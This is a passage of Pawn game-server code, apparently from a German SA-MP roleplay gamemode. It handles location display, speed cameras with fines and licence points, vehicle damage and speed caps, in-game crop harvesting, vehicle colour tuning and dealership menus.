				SetTimerEx("KICKHIM", 1, false, "d", playerid);
			}
		}
		if(IsPlayerInArea(playerid,6250.0020,-9489.2363,6524.3320,-9082.2637))
		{
	    	new string[30];
	        format(string,sizeof string,"Ort: Lake Vortex");
		    PlayerTextDrawSetString(playerid,Orttext[playerid],string);
	  	}
	  	else if(IsPlayerInArea(playerid,6267.8345,-8063.7998,6712.4614,-7656.9722))
		{
	    	new string[30];
	        format(string,sizeof string,"Ort: Santa Felton");
		    PlayerTextDrawSetString(playerid,Orttext[playerid],string);
	  	}
	  	else if(IsPlayerInArea(playerid,1610.5200,-7823.9722,1825.8999,-7432.3389))
		{
	    	new string[30];
	        format(string,sizeof string,"Ort: Villbeach");
		    PlayerTextDrawSetString(playerid,Orttext[playerid],string);
	  	}
	  	else if(IsPlayerInArea(playerid,4103.0376,-7741.1660,4552.1626,-7496.4761))
		{
	    	new string[30];
	        format(string,sizeof string,"Ort: Portland");
		    PlayerTextDrawSetString(playerid,Orttext[playerid],string);
	  	}
	  	else if(IsPlayerInArea(playerid,1522.2588,-9598.7383,1870.1095,-8654.7998) || IsPlayerInArea(playerid,1541.1846,-8666.5850,1703.2249,-8352.1406))
		{
	    	new string[30];
	        format(string,sizeof string,"Ort: Lake Sorten");
		    PlayerTextDrawSetString(playerid,Orttext[playerid],string);
	  	}else
  		{
   			new string[30];
	        format(string,sizeof string,"Ort: Ueberland");
		    PlayerTextDrawSetString(playerid,Orttext[playerid],string);
		}
		if(SpielerInfo[playerid][uWantedLevel] > 0 && ci_map_state[playerid] == false)
		{
			if(wangezeigt[playerid] == 0)
			{
			    wangezeigt[playerid] = 1;
   				PlayerTextDrawShow(playerid,Wantedtext[0][playerid]);
				PlayerTextDrawShow(playerid,Wantedtext[1][playerid]);
			}
			new string[30];
	        format(string,sizeof string,"WANTEDS: %d",SpielerInfo[playerid][uWantedLevel]);
		    PlayerTextDrawSetString(playerid,Wantedtext[0][playerid],string);
		}
		else if(ci_map_state[playerid] == false)
		{
		    PlayerTextDrawHide(playerid,Wantedtext[0][playerid]);
			PlayerTextDrawHide(playerid,Wantedtext[1][playerid]);
			wangezeigt[playerid] = 0;
		}
	    SpielerInfo[playerid][uDesktop] = gettime();
		if(IsPlayerInAnyVehicle(playerid))
		{
			new Float:X,Float:Y,Float:Z,Geschwindigkeit,string[15];
			for(new x = 0; x < 3; x++)
			{
				if(IsPlayerInRangeOfPoint(playerid,12,Blitzer[x][blitzx],Blitzer[x][blitzy],Blitzer[x][blitzz]) && kannblitz[playerid] == 0 && SpielerInfo[playerid][uDienst] == 0)
				{
				    new str[130];
				    GetVehicleVelocity(GetPlayerVehicleID(playerid),X,Y,Z);
					Geschwindigkeit = floatround(floatsqroot(X*X + Y*Y + Z*Z) * 95 * 2);
					if(Geschwindigkeit > Blitzer[x][blitzgw] && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
					{
					    if(SpielerInfo[playerid][uFuehrerschein] == 0 && SpielerInfo[playerid][uMotorradschein] == 0 && SpielerInfo[playerid][uRollerschein] == 0 && SpielerInfo[playerid][uBootsschein] == 0 && SpielerInfo[playerid][uHelischein] == 0 && SpielerInfo[playerid][uLKWschein] == 0)
					    {
  							new prs = Geschwindigkeit-Blitzer[x][blitzgw];
							new Float:zahlen = prs*1;
							GebeGeld(playerid,-zahlen);
							kannblitz[playerid] = 1;
							TextDrawShowForPlayer(playerid,blitzerfl);
							SetTimerEx("blitzkann", 10000, false, "d", playerid);
							SetTimerEx("bildweg", 100, false, "d", playerid);
							PlayerPlaySound(playerid,1132,0.0,0.0,0.0);
  							format(str,sizeof(str),"Du wurdest mit %d KM/H geblitzt. %d KM/H warst du zu schnell und musst %.2f$ zahlen!",Geschwindigkeit,prs,zahlen);
							SendClientMessage(playerid,COLOR_YELLOW,str);
							SendClientMessage(playerid,COLOR_YELLOW,"Du besitzt keine Führerscheine! Du bekommst einen Wanted!");
							SpielerInfo[playerid][uWantedLevel] ++;
							Fraktionskasse[1] += zahlen/1+0.0001;
							Fraktionskasse[2] += zahlen/1+0.0001;
							Frakkassespeichern(1);
							Frakkassespeichern(2);
					    }
					    else
						{
							new prs = Geschwindigkeit-Blitzer[x][blitzgw];
							new Float:zahlen = prs*1.5;
							GebeGeld(playerid,-zahlen);
							kannblitz[playerid] = 1;
							TextDrawShowForPlayer(playerid,blitzerfl);
							SetTimerEx("blitzkann", 10000, false, "d", playerid);
							SetTimerEx("bildweg", 100, false, "d", playerid);
							PlayerPlaySound(playerid,1132,0.0,0.0,0.0);
							Fraktionskasse[1] += zahlen/1+0.0001;
							Fraktionskasse[2] += zahlen/1+0.0001;
							Frakkassespeichern(1);
							Frakkassespeichern(2);
							format(str,sizeof(str),"Du wurdest mit %d KM/H geblitzt. %d KM/H warst du zu schnell und musst %.2f$ zahlen!",Geschwindigkeit,prs,zahlen);
							SendClientMessage(playerid,COLOR_YELLOW,str);
							if(prs > 41)
							{
							    SpielerInfo[playerid][upunkte] += 3;
	    						format(str,sizeof(str),"Du warst über 41 KM/H zu schnell und bekommst 3 Punkte. Aktuelle Punkte: %d",SpielerInfo[playerid][upunkte]);
								SendClientMessage(playerid,COLOR_YELLOW,str);
							}
							else if(prs > 31)
							{
							    SpielerInfo[playerid][upunkte] += 2;
	    						format(str,sizeof(str),"Du warst über 31 KM/H zu schnell und bekommst 2 Punkte. Aktuelle Punkte: %d",SpielerInfo[playerid][upunkte]);
								SendClientMessage(playerid,COLOR_YELLOW,str);
							}
							else if(prs > 21)
							{
							    SpielerInfo[playerid][upunkte] += 1;
	    						format(str,sizeof(str),"Du warst über 21 KM/H zu schnell und bekommst einen Punkt. Aktuelle Punkte: %d",SpielerInfo[playerid][upunkte]);
								SendClientMessage(playerid,COLOR_YELLOW,str);
							}
							else
							{
							    SendClientMessage(playerid,COLOR_YELLOW,"Du warst unter 21 KM/H und bekommst keinen Punkt!");
							}
							if(SpielerInfo[playerid][upunkte] >= 10)
							{
								SendClientMessage(playerid,COLOR_YELLOW,"Du hast 10 Punkte, deshalb wurden dir deine Führerscheine abgenommen!");
								SpielerInfo[playerid][uFuehrerschein] = 0;
								SpielerInfo[playerid][uMotorradschein] = 0;
								SpielerInfo[playerid][uRollerschein] = 0;
								SpielerInfo[playerid][uBootsschein] = 0;
								SpielerInfo[playerid][uHelischein] = 0;
								SpielerInfo[playerid][uLKWschein] = 0;
								SpielerInfo[playerid][upunkte] = 0;
								SpielerInfo[playerid][uTheorie] = 0;
							}
						}
					}
				}
			}
			for(new i = 0; i < MAX_PLAYERS; i++)
		    {
		        for(new x = 0; x < 2; x++)
		        {
		            new autoid = GetPlayerVehicleID(playerid);
   			    	new Float:health;
					GetVehicleHealth(GetPlayerVehicleID(playerid),health);
		            if(autoid == SAuto[i][x][sID])
		            {
      					if(health < 275)
						{
						    SetVehicleHealth(autoid,270);
						    if(Motorschaden2[autoid] == 0)
						    {
						        new engine,lights,alarm,doors,bonnet,boot,objective;
						        if(mbekommen[playerid] == 0)
						        {
									SendClientMessage(playerid,COLOR_RED,"Das Fahrzeug hat einen Motorschaden. Rufe das Fire & Rescue Department mit /service!");
									GetVehicleParamsEx(autoid,engine,lights,alarm,doors,bonnet,boot,objective);
									SetVehicleParamsEx(autoid,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
									mbekommen[playerid] = 1;
								}
								SetVehicleHealth(autoid,270);
								Motorschaden2[autoid] = 1;
								Freeze(playerid);
								Unfreeze(playerid);
								SAuto[playerid][i][sMotorschaden] = 1;
								GetVehicleParamsEx(autoid, engine, lights, alarm, doors, bonnet, boot, objective);
								SetVehicleParamsEx(autoid, VEHICLE_PARAMS_OFF, lights, alarm, doors, bonnet, boot, objective);
								PlayerTextDrawSetString(playerid, TachoText[i][8], "Motor: ~r~aus");

							}
							else{
							    if(mbekommen[playerid] == 0)
						        {
								    SetVehicleHealth(autoid,270);
								    mbekommen[playerid] = 1;
								    SendClientMessage(playerid,COLOR_RED,"Das Fahrzeug hat einen Motorschaden. Rufe das Fire & Rescue Department mit /service!");
								    new engine, lights, alarm, doors, bonnet, boot, objective;
									GetVehicleParamsEx(autoid, engine, lights, alarm, doors, bonnet, boot, objective);
									SetVehicleParamsEx(autoid, VEHICLE_PARAMS_OFF, lights, alarm, doors, bonnet, boot, objective);
									PlayerTextDrawSetString(playerid, TachoText[i][8], "Motor: ~r~aus");
								}
			 				}
						}
		            }
		            /*for(new v = 0; v < MAX_VEHICLES; v++)
		            {
			            if(SAuto[i][x][sID] == v)
			            {
          					new Float:xx,Float:yy,Float:zz;
		            		GetVehiclePos(SAuto[i][x][sID],xx,yy,zz);
				            if(zz < 0.5)
				            {
				                SAuto[i][x][sKilometer] = (Meter[SAuto[i][x][sID]]+GetDistanceToLastPoint(SAuto[i][x][sID])) / 250;
				                DestroyVehicle(SAuto[i][x][sID]);
				                SendClientMessage(i,COLOR_RED,"Privatfahrzeug wurde ist versunken! Benutze /reparieren");
				                SAuto[i][x][sreperatur] = 1;
				               	SAuto[i][x][sID] = -2;
				                return 1;
				            }
						}
					}*/
		        }
			}
 			if(!IstEinKeinFuehrerscheinFahrzeug(GetPlayerVehicleID(playerid)))
			{
			    new Float:health;
				GetVehicleHealth(GetPlayerVehicleID(playerid),health);
				GetVehicleVelocity(GetPlayerVehicleID(playerid),X,Y,Z);
				Geschwindigkeit = floatround(floatsqroot(X*X + Y*Y + Z*Z) * 95 * 2);
				format(string,sizeof(string),"%d KM/H",Geschwindigkeit);
				PlayerTextDrawSetString(playerid,TachoText[playerid][11],string);

				format(string,sizeof(string),"%.0f%",health/10+0.1);
				PlayerTextDrawSetString(playerid, TachoText[playerid][13], string);


			}
			if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 578 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
			{
			    GetVehicleVelocity(GetPlayerVehicleID(playerid),X,Y,Z);
				Geschwindigkeit = floatround(floatsqroot(X*X + Y*Y + Z*Z) * 95 * 2);
				if(Geschwindigkeit > 40) SetVehicleVelocity(GetPlayerVehicleID(playerid),X/Geschwindigkeit*40,Y/Geschwindigkeit*40,Z/Geschwindigkeit*40);
			}
			if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 462 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
			{
			    GetVehicleVelocity(GetPlayerVehicleID(playerid),X,Y,Z);
				Geschwindigkeit = floatround(floatsqroot(X*X + Y*Y + Z*Z) * 95 * 2);
				if(Geschwindigkeit > 80) SetVehicleVelocity(GetPlayerVehicleID(playerid),X/Geschwindigkeit*80,Y/Geschwindigkeit*80,Z/Geschwindigkeit*80);
			}
			if((GetVehicleModel(GetPlayerVehicleID(playerid)) == 532 || GetVehicleModel(GetPlayerVehicleID(playerid)) ==531)&& GetPlayerState(playerid) == PLAYER_STATE_DRIVER)//Mähdrescher
			{
			    GetVehicleVelocity(GetPlayerVehicleID(playerid),X,Y,Z);
				Geschwindigkeit = floatround(floatsqroot(X*X + Y*Y + Z*Z) * 95 * 2);
				if(Geschwindigkeit > 20) SetVehicleVelocity(GetPlayerVehicleID(playerid),X/Geschwindigkeit*20,Y/Geschwindigkeit*20,Z/Geschwindigkeit*20);
			}
			if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 509 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)//Fahrrad
			{
			    GetVehicleVelocity(GetPlayerVehicleID(playerid),X,Y,Z);
				Geschwindigkeit = floatround(floatsqroot(X*X + Y*Y + Z*Z) * 95 * 2);
				if(Geschwindigkeit > 30) SetVehicleVelocity(GetPlayerVehicleID(playerid),X/Geschwindigkeit*30,Y/Geschwindigkeit*30,Z/Geschwindigkeit*30);
			}
			if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 510 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)//Mountain
			{
			    GetVehicleVelocity(GetPlayerVehicleID(playerid),X,Y,Z);
				Geschwindigkeit = floatround(floatsqroot(X*X + Y*Y + Z*Z) * 95 * 2);
				if(Geschwindigkeit > 45) SetVehicleVelocity(GetPlayerVehicleID(playerid),X/Geschwindigkeit*45,Y/Geschwindigkeit*45,Z/Geschwindigkeit*45);
			}
			if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 481 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)//BMX
			{
			    GetVehicleVelocity(GetPlayerVehicleID(playerid),X,Y,Z);
				Geschwindigkeit = floatround(floatsqroot(X*X + Y*Y + Z*Z) * 95 * 2);
				if(Geschwindigkeit > 40) SetVehicleVelocity(GetPlayerVehicleID(playerid),X/Geschwindigkeit*40,Y/Geschwindigkeit*40,Z/Geschwindigkeit*40);
			}
			if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 531 && GetVehicleModel(GetVehicleTrailer(GetPlayerVehicleID(playerid))) == 610 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 532)
			{
			    new str[30];
				for(new d = 0; d < sizeof(Felder); d++)
				{
					if(WeedStatus[d] == 1)
  					{
	        		    if(IsVehicleInRangeOfPoint(GetPlayerVehicleID(playerid),3.0,Felder[d][0],Felder[d][1],5.29) && GetVehicleModel(GetPlayerVehicleID(playerid)) == 532)
	        		    {
	        		        GetDynamicObjectPos(Weed[d],X,Y,Z);
	        		        new Float:VX,Float:VY,Float:VZ;
	        		        GetVehiclePos(GetPlayerVehicleID(playerid),VX,VY,VZ);
	        		        if(Z == 4.25)
	        		        {
								DestroyDynamicObject(Weed[d]);
								Weed[d] = CreateDynamicObject(16304,Felder[d][0],Felder[d][1],0.95,0.0,0.0,0.0);
								WeedStatus[d] = 0;
								new Float:geld = 0.65+random(4);
								GebeGeld(playerid,geld);
								format(str,sizeof(str),"Ernten %.2f$",geld);
								SendClientMessage(playerid,COLOR_GREEN,str);
							}
							break;
						}
					}
					else
					{
			  			if(IsVehicleInRangeOfPoint(GetVehicleTrailer(GetPlayerVehicleID(playerid)),2.0,Felder[d][0],Felder[d][1],5.29) && GetVehicleModel(GetVehicleTrailer(GetPlayerVehicleID(playerid))) == 610)
			    		{
	    					DestroyDynamicObject(Weed[d]);
						   	Weed[d] = CreateDynamicObject(855,Felder[d][0],Felder[d][1],-1.81,0.0,0.0,0.0);
							WeedStatus[d] = 1;
							MoveDynamicObject(Weed[d],Felder[d][0],Felder[d][1],4.25,0.02);
							new Float:geld = 0.65+random(4);
							GebeGeld(playerid,geld);
							format(str,sizeof(str),"Anpflanzen: %.2f$",geld);
							SendClientMessage(playerid,COLOR_GREEN,str);
							break;
						}
					}
				}
			}
			if(Tuning_farbe[playerid] != 0)
			{
	  			new Keys,ud,lr;
				GetPlayerKeys(playerid,Keys,ud,lr);
				if(ud < 0)//UP
				{
	   				if(Tuning_farbe[playerid] > 8) Tuning_farbe[playerid] -= 8;
				    else Tuning_farbe[playerid] += 56;
				    new value = Tuning_farbe[playerid]-1;
					while(value >= 8)
			 		{
		    			value -= 8;
				 	}
		    		PlayerTextDrawHide(playerid,Farbtabelle_rahmen[playerid]);
				    PlayerTextDrawDestroy(playerid,Farbtabelle_rahmen[playerid]);
				    Farbtabelle_rahmen[playerid] = CreatePlayerTextDraw(playerid,252.000000+19*value, 128.000000+22*floatround(Tuning_farbe[playerid]/8,floatround_floor), "~n~");
					PlayerTextDrawLetterSize(playerid,Farbtabelle_rahmen[playerid], 0.500000, 1.900000);
					PlayerTextDrawUseBox(playerid,Farbtabelle_rahmen[playerid], 1);
					PlayerTextDrawBoxColor(playerid,Farbtabelle_rahmen[playerid], 0xFFFFFFAA);
					PlayerTextDrawTextSize(playerid,Farbtabelle_rahmen[playerid], 230.000000+19*value, 0.000000);
					PlayerTextDrawShow(playerid,Farbtabelle_rahmen[playerid]);
					if(Tune_Farbe1[playerid] == -1) ChangeVehicleColor(GetPlayerVehicleID(playerid),PayNSprayFarben[Tuning_farbe[playerid]-1][1],PayNSprayFarben[Tuning_farbe[playerid]-1][1]);
					else ChangeVehicleColor(GetPlayerVehicleID(playerid),PayNSprayFarben[Tune_Farbe1[playerid]-1][1],PayNSprayFarben[Tuning_farbe[playerid]-1][1]);
				}
				else if(ud > 0)//DOWN
				{
					if(Tuning_farbe[playerid] < 57) Tuning_farbe[playerid] += 8;
				    else Tuning_farbe[playerid] -= 56;
		   			new value = Tuning_farbe[playerid]-1;
			 		while(value >= 8)
					{
				 	    value -= 8;
				 	}
				    PlayerTextDrawHide(playerid,Farbtabelle_rahmen[playerid]);
				    PlayerTextDrawDestroy(playerid,Farbtabelle_rahmen[playerid]);
				    Farbtabelle_rahmen[playerid] = CreatePlayerTextDraw(playerid,252.000000+19*value, 128.000000+22*floatround((Tuning_farbe[playerid]-1)/8,floatround_floor), "~n~");
					PlayerTextDrawLetterSize(playerid,Farbtabelle_rahmen[playerid], 0.500000, 1.900000);
					PlayerTextDrawUseBox(playerid,Farbtabelle_rahmen[playerid], 1);
					PlayerTextDrawBoxColor(playerid,Farbtabelle_rahmen[playerid], 0xFFFFFFAA);
					PlayerTextDrawTextSize(playerid,Farbtabelle_rahmen[playerid], 230.000000+19*value, 0.000000);
					PlayerTextDrawShow(playerid,Farbtabelle_rahmen[playerid]);
					if(Tune_Farbe1[playerid] == -1) ChangeVehicleColor(GetPlayerVehicleID(playerid),PayNSprayFarben[Tuning_farbe[playerid]-1][1],PayNSprayFarben[Tuning_farbe[playerid]-1][1]);
					else ChangeVehicleColor(GetPlayerVehicleID(playerid),PayNSprayFarben[Tune_Farbe1[playerid]-1][1],PayNSprayFarben[Tuning_farbe[playerid]-1][1]);
				}
				else if(lr > 0)//RIGHT
				{
	   				if(Tuning_farbe[playerid] != 8 && Tuning_farbe[playerid] != 16 && Tuning_farbe[playerid] != 24 && Tuning_farbe[playerid] != 32 && Tuning_farbe[playerid] != 40 && Tuning_farbe[playerid] != 48 && Tuning_farbe[playerid] != 56 && Tuning_farbe[playerid] != 64)
					{
	    				Tuning_farbe[playerid]++;
						new value = Tuning_farbe[playerid]-1;
					 	while(value >= 8)
					 	{
					 	    value -= 8;
					 	}
					    PlayerTextDrawHide(playerid,Farbtabelle_rahmen[playerid]);
					    PlayerTextDrawDestroy(playerid,Farbtabelle_rahmen[playerid]);
					    Farbtabelle_rahmen[playerid] = CreatePlayerTextDraw(playerid,252.000000+19*value, 128.0000+22*floatround((Tuning_farbe[playerid]-1)/8,floatround_floor), "~n~");
						PlayerTextDrawLetterSize(playerid,Farbtabelle_rahmen[playerid], 0.500000, 1.900000);
						PlayerTextDrawUseBox(playerid,Farbtabelle_rahmen[playerid], 1);
						PlayerTextDrawBoxColor(playerid,Farbtabelle_rahmen[playerid], 0xFFFFFFAA);
						PlayerTextDrawTextSize(playerid,Farbtabelle_rahmen[playerid], 230.000000+19*value, 0.000000);
						PlayerTextDrawShow(playerid,Farbtabelle_rahmen[playerid]);
					}
					else if(Tuning_farbe[playerid] == 64)
					{
					    Tuning_farbe[playerid] = 1;
			            PlayerTextDrawHide(playerid,Farbtabelle_rahmen[playerid]);
					    PlayerTextDrawDestroy(playerid,Farbtabelle_rahmen[playerid]);
					    Farbtabelle_rahmen[playerid] = CreatePlayerTextDraw(playerid,252.000000, 128.0000, "~n~");
						PlayerTextDrawLetterSize(playerid,Farbtabelle_rahmen[playerid], 0.500000, 1.900000);
						PlayerTextDrawUseBox(playerid,Farbtabelle_rahmen[playerid], 1);
						PlayerTextDrawBoxColor(playerid,Farbtabelle_rahmen[playerid], 0xFFFFFFAA);
						PlayerTextDrawTextSize(playerid,Farbtabelle_rahmen[playerid], 230.000000, 0.000000);
						PlayerTextDrawShow(playerid,Farbtabelle_rahmen[playerid]);
					}
					else
					{
	    				Tuning_farbe[playerid]++;
	        			PlayerTextDrawHide(playerid,Farbtabelle_rahmen[playerid]);
					    PlayerTextDrawDestroy(playerid,Farbtabelle_rahmen[playerid]);
					    Farbtabelle_rahmen[playerid] = CreatePlayerTextDraw(playerid,252.000000, 128.0000+22*floatround(Tuning_farbe[playerid]/8,floatround_floor), "~n~");
						PlayerTextDrawLetterSize(playerid,Farbtabelle_rahmen[playerid], 0.500000, 1.900000);
						PlayerTextDrawUseBox(playerid,Farbtabelle_rahmen[playerid], 1);
						PlayerTextDrawBoxColor(playerid,Farbtabelle_rahmen[playerid], 0xFFFFFFAA);
						PlayerTextDrawTextSize(playerid,Farbtabelle_rahmen[playerid], 230.000000, 0.000000);
						PlayerTextDrawShow(playerid,Farbtabelle_rahmen[playerid]);
					}
					if(Tune_Farbe1[playerid] == -1) ChangeVehicleColor(GetPlayerVehicleID(playerid),PayNSprayFarben[Tuning_farbe[playerid]-1][1],PayNSprayFarben[Tuning_farbe[playerid]-1][1]);
					else ChangeVehicleColor(GetPlayerVehicleID(playerid),PayNSprayFarben[Tune_Farbe1[playerid]-1][1],PayNSprayFarben[Tuning_farbe[playerid]-1][1]);
				}
				else if(lr < 0)//LEFT
				{
	   				if(Tuning_farbe[playerid] != 1 && Tuning_farbe[playerid] != 9 && Tuning_farbe[playerid] != 17 && Tuning_farbe[playerid] != 25 && Tuning_farbe[playerid] != 33 && Tuning_farbe[playerid] != 41 && Tuning_farbe[playerid] != 49 && Tuning_farbe[playerid] != 57)
					{
	    				Tuning_farbe[playerid]--;
					 	new value = Tuning_farbe[playerid]-1;
					 	while(value >= 8)
					 	{
					 	    value -= 8;
					 	}
					    PlayerTextDrawHide(playerid,Farbtabelle_rahmen[playerid]);
					    PlayerTextDrawDestroy(playerid,Farbtabelle_rahmen[playerid]);
					    Farbtabelle_rahmen[playerid] = CreatePlayerTextDraw(playerid,252.000000+19*value, 128.000+22*floatround((Tuning_farbe[playerid]-1)/8,floatround_floor), "~n~");
						PlayerTextDrawLetterSize(playerid,Farbtabelle_rahmen[playerid], 0.500000, 1.900000);
						PlayerTextDrawUseBox(playerid,Farbtabelle_rahmen[playerid], 1);
						PlayerTextDrawBoxColor(playerid,Farbtabelle_rahmen[playerid], 0xFFFFFFAA);
						PlayerTextDrawTextSize(playerid,Farbtabelle_rahmen[playerid], 230.000000+19*value, 0.000000);
						PlayerTextDrawShow(playerid,Farbtabelle_rahmen[playerid]);
					}
					else if(Tuning_farbe[playerid] == 1)
					{
					    Tuning_farbe[playerid] = 64;
			            PlayerTextDrawHide(playerid,Farbtabelle_rahmen[playerid]);
					    PlayerTextDrawDestroy(playerid,Farbtabelle_rahmen[playerid]);
					    Farbtabelle_rahmen[playerid] = CreatePlayerTextDraw(playerid,252.000000+19*7, 128.0000+22*7, "~n~");
						PlayerTextDrawLetterSize(playerid,Farbtabelle_rahmen[playerid], 0.500000, 1.900000);
						PlayerTextDrawUseBox(playerid,Farbtabelle_rahmen[playerid], 1);
						PlayerTextDrawBoxColor(playerid,Farbtabelle_rahmen[playerid], 0xFFFFFFAA);
						PlayerTextDrawTextSize(playerid,Farbtabelle_rahmen[playerid], 230.000000+19*7, 0.000000);
						PlayerTextDrawShow(playerid,Farbtabelle_rahmen[playerid]);
					}
					else
					{
			            Tuning_farbe[playerid]--;
			            PlayerTextDrawHide(playerid,Farbtabelle_rahmen[playerid]);
					    PlayerTextDrawDestroy(playerid,Farbtabelle_rahmen[playerid]);
					    Farbtabelle_rahmen[playerid] = CreatePlayerTextDraw(playerid,252.000000+19*7, 128.0000+22*floatround((Tuning_farbe[playerid]-1)/8), "~n~");
						PlayerTextDrawLetterSize(playerid,Farbtabelle_rahmen[playerid], 0.500000, 1.900000);
						PlayerTextDrawUseBox(playerid,Farbtabelle_rahmen[playerid], 1);
						PlayerTextDrawBoxColor(playerid,Farbtabelle_rahmen[playerid], 0xFFFFFFAA);
						PlayerTextDrawTextSize(playerid,Farbtabelle_rahmen[playerid], 230.000000+19*7, 0.000000);
						PlayerTextDrawShow(playerid,Farbtabelle_rahmen[playerid]);
					}
					if(Tune_Farbe1[playerid] == -1) ChangeVehicleColor(GetPlayerVehicleID(playerid),PayNSprayFarben[Tuning_farbe[playerid]-1][1],PayNSprayFarben[Tuning_farbe[playerid]-1][1]);
					else ChangeVehicleColor(GetPlayerVehicleID(playerid),PayNSprayFarben[Tune_Farbe1[playerid]-1][1],PayNSprayFarben[Tuning_farbe[playerid]-1][1]);
				}
			}
		}
		else if(FrakAutochoose[playerid] > -1)
		{
		    new Keys,ud,lr,string[50];
   			GetPlayerKeys(playerid,Keys,ud,lr);
   			if(SpielerInfo[playerid][uLeiter] > 0)
   			{
	   			if(lr < 0)
			   	{
			   		FrakAutochoose[playerid]--;
				   	if(FrakAutochoose[playerid] < 0)
					{
					    for(new x = 11; x > 0; x--)
					    {
					        if(AutoListe[SpielerInfo[playerid][uLeiter]-1][x] != -1)
					        {
						 		FrakAutochoose[playerid] = x;
						 		break;
		 					}
						}
				 	}
		   		}
	   			if(lr > 0)
			   	{
			   		FrakAutochoose[playerid]++;
			   		for(new x = 11; x > 0; x--)
				    {
        				if(AutoListe[SpielerInfo[playerid][uLeiter]-1][x] != -1)
				        {
					 		if(FrakAutochoose[playerid] > x)
					 		{
					 		    FrakAutochoose[playerid] = 0;
					 		}
					 		break;
	 					}
					}
		   		}
		   		if(lr != 0)
		   		{
	   				format(string,sizeof string,"Autoname: %s",AutoDaten[AutoListe[SpielerInfo[playerid][uLeiter]-1][FrakAutochoose[playerid]]-399][AutoName]);
					PlayerTextDrawSetString(playerid,Autohaus[playerid][1],string);
					if(AutoDaten[AutoListe[SpielerInfo[playerid][uLeiter]-1][FrakAutochoose[playerid]]-399][aKraftstoff] == 0) PlayerTextDrawSetString(playerid,Autohaus[playerid][3],"Kraftstoff: Diesel");
					else PlayerTextDrawSetString(playerid,Autohaus[playerid][3],"Kraftstoff: Benzin");
					format(string,sizeof string,"Preis: %d$",AutoListePreise[SpielerInfo[playerid][uLeiter]-1][FrakAutochoose[playerid]]);
					PlayerTextDrawSetString(playerid,Autohaus[playerid][2],string);
					format(string,sizeof string,"Tank: %dL",AutoDaten[AutoListe[SpielerInfo[playerid][uLeiter]-1][FrakAutochoose[playerid]]-399][MaxBenzin]);
					PlayerTextDrawSetString(playerid,Autohaus[playerid][4],string);
					PlayerTextDrawHide(playerid, Autohaus[playerid][7]);
					PlayerTextDrawSetPreviewModel(playerid,Autohaus[playerid][7],AutoListe[SpielerInfo[playerid][uLeiter]-1][FrakAutochoose[playerid]]);
					PlayerTextDrawShow(playerid, Autohaus[playerid][7]);
		   		}
			}
		}
		else if(Autochoose[playerid] != -1)
		{
		    if(SpielerInfo[playerid][uEingeloggt] == 1)
		    {
			    new Keys,ud,lr,string[50],Float:X,Float:Y,Float:Z;
	   			GetPlayerKeys(playerid,Keys,ud,lr);
			    if(lr < 0)//Links
				{
			 		Autochoose[playerid]--;
					if(Autochoose[playerid] < 0)
					{
    					if(AutohausChoose[playerid] == 0) Autochoose[playerid] = 41;
    					else Autochoose[playerid] = 41;
   					}
				}
			    else if(lr > 0)//Rechts
				{
					new x = Autochoose[playerid]+1;
					if(AutohausChoose[playerid] == 0)
					{
						if(x < 42) Autochoose[playerid] = x;
						else Autochoose[playerid] = 0;
					}
					else
					{
					    if(x < 11) Autochoose[playerid] = x;
						else Autochoose[playerid] = 0;
					}
				}
			    if(lr != 0)
			    {
			        Freeze(playerid);
					GetVehiclePos(AutohausAutos[AutohausChoose[playerid]][Autochoose[playerid]][0],X,Y,Z);
					if(GetVehicleModel(AutohausAutos[AutohausChoose[playerid]][Autochoose[playerid]][0]) == 509 || GetVehicleModel(AutohausAutos[AutohausChoose[playerid]][Autochoose[playerid]][0]) == 510 || GetVehicleModel(AutohausAutos[AutohausChoose[playerid]][Autochoose[playerid]][0]) == 481)
					{
					    SetPlayerCameraPos(playerid, X+5, Y+2, Z+2);
						SetPlayerCameraLookAt(playerid, X, Y, Z, CAMERA_MOVE);
					}
					else
					{
						SetPlayerCameraPos(playerid, X-5, Y-5, Z+3);
						SetPlayerCameraLookAt(playerid, X, Y, Z, CAMERA_MOVE);
					}
					format(string,sizeof string,"Autoname: %s",AutoDaten[GetVehicleModel(AutohausAutos[AutohausChoose[playerid]][Autochoose[playerid]][0])-399][AutoName]);
					PlayerTextDrawSetString(playerid,Autohaus[playerid][1],string);
					format(string,sizeof string,"Preis: %d$",AutohausAutos[AutohausChoose[playerid]][Autochoose[playerid]][1]);
					PlayerTextDrawSetString(playerid,Autohaus[playerid][2],string);
					format(string,sizeof string,"Verbrauch: %dL",AutoDaten[GetVehicleModel(AutohausAutos[AutohausChoose[playerid]][Autochoose[playerid]][0])-399][aVerbrauch]);
					PlayerTextDrawSetString(playerid,Autohaus[playerid][5],string);
					format(string,sizeof string,"Max km/h: %d",AutohausDaten[0][Autochoose[playerid]][2]);
					PlayerTextDrawSetString(playerid,Autohaus[playerid][6],string);
					if(AutoDaten[GetVehicleModel(AutohausAutos[AutohausChoose[playerid]][Autochoose[playerid]][0])-399][aKraftstoff] == 0) PlayerTextDrawSetString(playerid,Autohaus[playerid][3],"Kraftstoff: Diesel");
					else PlayerTextDrawSetString(playerid,Autohaus[playerid][3],"Kraftstoff: Benzin");
					format(string,sizeof string,"Tank: %dL",AutoDaten[GetVehicleModel(AutohausAutos[AutohausChoose[playerid]][Autochoose[playerid]][0])-399][MaxBenzin]);
					PlayerTextDrawSetString(playerid,Autohaus[playerid][4],string);
				}
			}
		}
		else if(MoebelKategorie[playerid] != -1)
		{
		    new Keys,ud,lr,string[10];
   			GetPlayerKeys(playerid,Keys,ud,lr);
		    if(lr < 0)
			{
				MoebelChoose[playerid]--;
				if(MoebelChoose[playerid] < 0)
				{
					MoebelChoose[playerid] = sizeof(MoebelStueck[])-1;
				    while(MoebelStueck[MoebelKategorie[playerid]][MoebelChoose[playerid]][0] == 0)
				    {
				        MoebelChoose[playerid]--;
				    }
				}
			}
